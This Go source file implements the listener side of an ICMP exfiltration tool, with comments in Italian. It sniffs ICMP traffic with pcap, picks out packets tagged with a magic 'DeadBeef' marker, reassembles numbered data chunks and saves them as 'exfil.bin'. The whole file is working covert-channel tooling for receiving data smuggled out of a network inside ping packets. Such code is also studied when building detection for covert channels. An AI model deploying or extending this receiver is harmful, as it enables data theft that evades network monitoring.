package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"os"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type ChunkData struct {
	TotalChunks uint32
	ChunkNumber uint32
	Data        []byte
}

type ICMPReceiver struct {
	Interface string
	Chunks    map[uint32][]byte
	Total     uint32
	Received  uint32
}

func NewICMPReceiver(iface string) *ICMPReceiver {
	return &ICMPReceiver{
		Interface: iface,
	}
}

func (r *ICMPReceiver) Start() {
	handle, err := pcap.OpenLive(r.Interface, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening interface: %v", err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter("icmp")
	if err != nil {
		log.Fatalf("Error setting BPF filter: %v", err)
	}

	fmt.Println("Waiting for ICMP packets from localhost...")

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet := <-packetSource.Packets()
		if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
			icmpPacket, _ := icmpLayer.(*layers.ICMPv4)
			if icmpPacket != nil {
				data := icmpPacket.Payload

				if len(data) >= 12 && binary.BigEndian.Uint32(data[:4]) == DeadBeef {
					r.Total = binary.BigEndian.Uint32(data[4:8])
					chunkNumber := binary.BigEndian.Uint32(data[8:12])
					payload := data[12:]

					if r.Chunks == nil {
						r.Chunks = make(map[uint32][]byte)
					}

					// Verifica se chunkNumber è valido
					if chunkNumber > 0 && chunkNumber <= r.Total {
						// Verifica se chunkNumber è già stato ricevuto
						if _, ok := r.Chunks[chunkNumber]; !ok {
							r.Chunks[chunkNumber] = payload
							r.Received++

							fmt.Printf("Received chunk %d/%d\n", r.Received, r.Total)

							if r.Received == r.Total {
								r.SaveToFile("exfil.bin")
								return
							}
						}
					}
				}
			}
		}
	}
}

func (r *ICMPReceiver) SaveToFile(filename string) {
	fmt.Printf("Received all required chunks. Saving to %s...\n", filename)

	// Concatena i chunk in ordine
	var orderedData []byte
	for i := uint32(1); i <= r.Total; i++ {
		orderedData = append(orderedData, r.Chunks[i]...)
	}

	// Apri il file per la scrittura
	file, err := os.Create(filename)
	if err != nil {
		log.Fatalf("Error creating %s: %v", filename, err)
	}
	defer file.Close()

	// Scrivi i dati nel file
	_, err = file.Write(orderedData)
	if err != nil {
		log.Fatalf("Error writing to %s: %v", filename, err)
	}

	fmt.Printf("Received data saved to %s.\n", filename)
}
